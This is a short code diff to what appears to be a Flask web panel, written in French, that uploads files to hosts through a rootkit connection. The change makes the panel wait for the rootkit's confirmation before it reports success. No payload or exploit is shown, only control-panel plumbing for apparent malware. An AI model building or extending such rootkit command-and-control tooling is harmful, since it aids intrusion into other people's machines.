@@ -51,7 +51,12 @@ def upload():
             if not success:
                 flash("❌ Échec de l’envoi du fichier.", 'error')
             else:
-                flash("📤 Fichier envoyé avec succès !", 'success')
+                # Ici on attend la confirmation du rootkit
+                confirmation = cfg.rootkit_connexion.receive_from_client()
+                if confirmation and "successfully" in confirmation.lower():
+                    flash("📤 Fichier envoyé avec succès !", 'success')
+                else:
+                    flash(f"❌ Problème de confirmation : {confirmation}", 'error')
 
         except Exception as e:
             flash(f"Erreur lors de l’envoi : {e}", 'error')
